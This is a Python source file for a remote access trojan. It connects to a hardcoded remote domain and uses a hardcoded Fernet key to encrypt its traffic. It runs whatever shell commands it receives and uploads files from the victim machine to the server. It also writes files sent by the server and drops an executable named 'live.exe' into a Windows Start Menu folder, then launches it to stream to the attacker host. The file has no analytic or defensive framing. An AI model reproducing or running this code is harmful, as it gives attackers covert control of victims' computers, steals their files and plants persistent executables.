import os, subprocess, socket
from cryptography.fernet import Fernet


SERVER_HOST = 'xn--6pw65a019d.xyz'
SERVER_PORT = 421
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"
sender_port = 423
key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='


s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
cwd = os.getcwd()
cwd = Fernet(key).encrypt(cwd.encode())
s.send(cwd)

while True:
    command = s.recv(BUFFER_SIZE)
    command = Fernet(key).decrypt(command).decode()
    splited_command = command.split()
    if command.lower() == "exit":
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        disconnected_msg = " disconnected quietly"
        disconnected_msg = f"{IPAddr}{disconnected_msg}"
        disconnected = Fernet(key).encrypt(disconnected_msg.encode())
        s.send(disconnected)
        break
    if command == "/getfile":
        filename = s.recv(BUFFER_SIZE)
        filename = Fernet(key).decrypt(filename).decode()
        if filename in os.listdir():
            with open(filename, "rb") as f:
                data = f.read()
                dataLen = len(data)
                s.send(dataLen.to_bytes(4,'big'))
                s.send(data)
            f.close()
    if command == "/sendfile":
        filename = s.recv(BUFFER_SIZE)
        filename = Fernet(key).decrypt(filename).decode()
        remaining = int.from_bytes(s.recv(4),'big')
        f = open(filename,"wb")
        while remaining:
            data = s.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
    if command == "/getlive":
        directory = r'"C:\Users\joe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\live.exe"'
        if os.path.exists(r'C:\Users\joe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\live.exe'):
            server_location = "yes"
            server_location = Fernet(key).encrypt(server_location.encode())
            s.send(server_location)
        else:
            server_location = "no"
            server_location = Fernet(key).encrypt(server_location.encode())
            s.send(server_location)
            remaining = int.from_bytes(s.recv(4),'big')
            f = open(r'C:\Users\joe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\live.exe',"wb")
            while remaining:
                data = s.recv(min(remaining,4096))
                remaining -= len(data)
                f.write(data)
            f.close()
        subprocess.Popen(f'cmd /k {directory} -n {SERVER_HOST} -p {sender_port} & exit')
        server_state = "live Streaming Server is running"
        server_state = Fernet(key).encrypt(server_state.encode())
        s.send(server_state)
        continue
    if command == "/stoplive":
        subprocess.Popen("cmd /k taskkill /im live.exe /f")
        sender_port = 422
        continue
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    message = Fernet(key).encrypt(message.encode())
    s.send(message)
s.close()